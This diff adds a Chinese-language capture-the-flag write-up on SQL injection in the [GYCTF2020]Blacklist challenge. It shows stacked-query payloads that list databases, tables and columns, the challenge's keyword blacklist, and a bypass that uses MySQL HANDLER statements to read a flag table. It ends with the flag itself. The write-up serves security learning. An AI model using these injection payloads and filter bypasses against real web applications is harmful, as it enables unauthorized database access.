@@ -1663,6 +1663,92 @@ if($arr[1] == "admin"){
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134710609?spm=1001.2014.3001.5501
 
+## [GYCTF2020]Blacklist 1详解（handler命令用法!)
+
+**题目环境**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701398609915-ece0a49f-76ca-4c20-b1c1-5c7caac1110b.png#averageHue=%23f8f7f6&clientId=ub648d401-cf6c-4&from=paste&height=206&id=u17a2bc28&originHeight=258&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43264&status=done&style=none&taskId=uddf5f47e-fedf-4276-8663-599f3115925&title=&width=1532)<br />**判断注入类型**
+> 1
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701398687192-9260cac2-aa44-482a-9d52-4671f9c8c219.png#averageHue=%23f5f5f4&clientId=uf03b8134-0ac6-4&from=paste&height=206&id=u6c88f5d4&originHeight=257&originWidth=838&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13906&status=done&style=none&taskId=u14f8c433-bea5-441d-8339-6eb6a4a966f&title=&width=670.4)
+> 1'
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701398732462-bbb1b438-95f9-4da0-ad13-9196fc2e454c.png#averageHue=%23f6f6f5&clientId=uf03b8134-0ac6-4&from=paste&height=164&id=u1591d597&originHeight=205&originWidth=1414&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18403&status=done&style=none&taskId=u54d69f7e-01a4-4a5f-af20-bd6afe1cde6&title=&width=1131.2)
+> 可知本题是字符型注入
+
+**查库**
+> 此题使用堆叠查询
+
+> 1';show databases;
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701399627338-ef3425d6-16be-4109-8539-13d0d52b0b93.png#averageHue=%23fbfbfb&clientId=uf03b8134-0ac6-4&from=paste&height=654&id=ue88897b7&originHeight=818&originWidth=1184&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24050&status=done&style=none&taskId=uc152a902-4fe1-4461-b390-851cdb26186&title=&width=947.2)<br />**查表**
+> 1';show tables;
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701399741341-07bce071-0ec6-4865-916a-3751ffaf7e0d.png#averageHue=%23fbfafa&clientId=uf03b8134-0ac6-4&from=paste&height=438&id=u9131ebc1&originHeight=547&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55130&status=done&style=none&taskId=u742cfe12-eb4c-4dcf-b579-7e6c2a4943a&title=&width=1536)
+> 存在FlagHere数据表
+> 极有可能当中存在flag
+
+**查字段数**
+> -- - 是闭合符
+
+> 1' order by 3 -- -
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701399847230-179eff21-0f34-47f9-9c54-67b99e2cc7ae.png#averageHue=%23f6f5f5&clientId=uf03b8134-0ac6-4&from=paste&height=158&id=u249770ea&originHeight=197&originWidth=1116&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13413&status=done&style=none&taskId=u857a022a-2975-427d-98ff-c299adfa2ad&title=&width=892.8)
+> 1' order by 2 -- -
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701399945487-9a31dbaa-1df1-45b2-a8b4-2c4f150e16b7.png#averageHue=%23f3f3f2&clientId=uf03b8134-0ac6-4&from=paste&height=196&id=u9658a0ed&originHeight=245&originWidth=803&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14716&status=done&style=none&taskId=u5362471e-bcd8-42df-a359-cec079eed63&title=&width=642.4)
+> 可知只有两个字段数
+
+**查FlagHere数据表的字段名**
+> 1';show columns from FlagHere;
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701400092217-f2325dc9-ed15-4875-8b7c-02bb01fc3dcb.png#averageHue=%23faf9f9&clientId=uf03b8134-0ac6-4&from=paste&height=447&id=u7cef8c88&originHeight=559&originWidth=988&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28404&status=done&style=none&taskId=u4ff39cae-c27b-488e-802e-35ad2e3043b&title=&width=790.4)
+> 存在flag字段！
+
+**查words数据表的字段名**
+> 1';show columns from words;
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701400333735-afeafad5-c5e0-4dc8-ba14-e31de617b406.png#averageHue=%23fcfcfc&clientId=uf03b8134-0ac6-4&from=paste&height=645&id=u8b2b490e&originHeight=806&originWidth=1848&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26327&status=done&style=none&taskId=uc059d0b5-ec13-4ce6-b74e-a9873322b4c&title=&width=1478.4)
+> **从这里看的话这题与buuctf[强网杯 2019]随便注 1这道题是有几分相似的**
+> **后者是通过改表名来获取flag值，但是前者既然放到了后边，应该没有那么容易**
+> **猜测修改表名的命令极有可能被过滤了**
+> **后者题解非常详细可以看看下面这个链接（同时也包含handler解法！）**
+> [**https://blog.csdn.net/m0_73734159/article/details/134049744**](https://blog.csdn.net/m0_73734159/article/details/134049744)
+
+**判断命令是否存在过滤**
+> rename
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701400570296-50d52273-30ff-486f-82f5-0a21687c4c66.png#averageHue=%23f1f0f0&clientId=uf03b8134-0ac6-4&from=paste&height=143&id=uf951e183&originHeight=179&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13985&status=done&style=none&taskId=u592158ce-7a37-4b9b-ab5e-184ef0da8b4&title=&width=736.8)
+> **return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);**
+> 果不其然改表名的两个关键命令被过滤了
+> rename和alter
+> 包括查询命令也被过滤了
+> select
+
+**通过handler命令获取flag**
+> select这个查询命令大家都很熟悉
+> 但是我们却忽略了一个也很重要的角色
+> 那就是handler查询命令
+> 虽然handler这个命令不常见
+> 但是它也非常强大
+
+> **handler命令查询规则**
+> - `handler table_name open;handler table_name read first;handler table_name close;`
+> - `handler table_name open;handler table_name read next;handler table_name close;`
+> 
+**如何理解？**
+> - 首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。
+> - 首先打开数据库，开始循环读取，读取成功后进行关闭操作。
+
+**构造payload**
+
+- `1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;`
+- `1';handler FlagHere open;handler FlagHere read next;handler FlagHere close;`
+
+**上传payload**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701401562659-c806d76d-5ad6-451b-bbc0-ee2a5238e4a8.png#averageHue=%23f9f9f9&clientId=uf03b8134-0ac6-4&from=paste&height=305&id=ufae86714&originHeight=381&originWidth=1534&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26823&status=done&style=none&taskId=ub5344bd7-b139-4e05-9b5c-6426106df88&title=&width=1227.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701401640121-acb838ba-046e-44dc-9885-410a7ce52dd0.png#averageHue=%23f9f8f8&clientId=uf03b8134-0ac6-4&from=paste&height=298&id=ud9630d4b&originHeight=372&originWidth=1238&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25898&status=done&style=none&taskId=u786a9623-a470-430f-86ee-59c19636df1&title=&width=990.4)<br />**得到flag：**<br />`flag{29e0c4b0-b659-4115-a74c-f3c25d3aac9b}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134731461?spm=1001.2014.3001.5501
+
+
+
 
 
 
